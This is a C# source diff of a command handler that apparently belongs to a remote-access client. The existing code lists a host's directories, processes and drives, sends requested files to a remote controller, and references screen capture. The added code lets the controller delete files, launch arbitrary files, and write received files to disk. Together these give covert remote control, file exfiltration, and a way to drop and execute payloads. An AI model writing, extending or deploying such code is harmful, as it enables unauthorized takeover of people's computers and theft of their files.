@@ -1,7 +1,5 @@
 ﻿namespace Core.Command
 {
-    using Core.Screenshot;
-    using Core.Connection;
     using System;
     using System.Diagnostics;
     using System.Threading;
@@ -9,10 +7,16 @@
     using System.IO;
     using System.Linq;
 
+    using Core.Screenshot;
+    using Core.Connection;
+
     public class Command
     {
         private readonly Connection _connection;
         private readonly ScreenCapture _screenShot;
+
+        private const int DIRECTORY_INTERVAL = 5;
+        private const int TASKS_INTERVAL = 5;
 
         private static string previousDirectory = string.Empty;
 
@@ -46,7 +50,7 @@
                     folder,
                     "0"));
 
-                Thread.Sleep(10);
+                Thread.Sleep(DIRECTORY_INTERVAL);
             }
 
             foreach (var file in directoryFiles)
@@ -60,7 +64,7 @@
                     file,
                     new FileInfo(file).Length));
 
-                Thread.Sleep(10);
+                Thread.Sleep(DIRECTORY_INTERVAL);
             }
 
             previousDirectory = directoryPattern;
@@ -98,7 +102,7 @@
 
                         _connection?.SendData(processString);
 
-                        Thread.Sleep(10);
+                        Thread.Sleep(TASKS_INTERVAL);
                     }
                 }
 
@@ -165,7 +169,6 @@
                                         case DriveType.Unknown:
                                             driveType = "Unknown";
                                             break;
-
                                     }
 
                                     var information = string.Format(
@@ -177,7 +180,7 @@
 
                                     _connection?.SendData(information);
 
-                                    Thread.Sleep(10);
+                                    Thread.Sleep(DIRECTORY_INTERVAL);
                                 }
 
                                 break;
@@ -201,6 +204,7 @@
                         return;
                     }
 
+                    // Getting the File Size
                     var fileSize = new FileInfo(fileName).Length;
 
                     var information = string.Format("|archivo|{0}|{1}|", fileSize, fileName.Split('\\').LastOrDefault());
@@ -212,6 +216,79 @@
                         _connection?.SendData(information);
                         _connection?.SendData(buffer);
                     }
+
+                    return;
+                }
+
+                if (commandReceived.Contains("del"))
+                {
+                    var path = Regex.Split(commandReceived, "del")[1];
+
+                    // This avoid possible error/exception if we've recived a invalid path to open/delete
+                    if (File.Exists(path))
+                    {
+                        File.Delete(path);
+                    }
+
+                    return;
+                }
+
+                if (commandReceived.Contains("ope"))
+                {
+                    var path = Regex.Split(commandReceived, "ope")[1];
+
+                    // This avoid possible error/exception if we've recived a invalid path to open/delete
+                    if (File.Exists(path))
+                    {
+                        var pi = new ProcessStartInfo(path);
+
+                        Process.Start(pi);
+                    }
+
+                    return;
+                }
+
+                if (commandReceived.Contains("fil"))
+                {
+                    var fileInfo = Regex.Split(commandReceived, "fil")[1];
+                    var dataExtension = fileInfo.Contains("*")
+                        ? fileInfo.Split('*') : default(string[]);
+
+                    // Error in command
+                    if (dataExtension == null)
+                    {
+                        return;
+                    }
+
+                    var dataSplitted = dataExtension.Contains("+")
+                        ? dataExtension[1].Split('+') : default(string[]);
+
+                    // Error in command
+                    if (dataSplitted == null)
+                    {
+                        return;
+                    }
+
+                    // TODO: Change it for TryParse and in case of error, return and exit from this function
+                    long fileSize = long.Parse(dataSplitted[0]);
+
+                    var extension = dataExtension[0];
+                    var filePath = string.Format("{0}.{1}", dataSplitted[1], extension);
+
+                    // TODO: Review this function in order to test that everything works as expected
+                    _connection?.ReceiveInformationForPath((fileBuffer) =>
+                    {
+                        if (File.Exists(filePath))
+                        {
+                            File.Delete(filePath);
+                        }
+
+                        using (var streamWriter = new StreamWriter(filePath))
+                        {
+                            streamWriter.Write(fileBuffer);
+                            streamWriter.Close();
+                        }
+                    });
 
                     return;
                 }
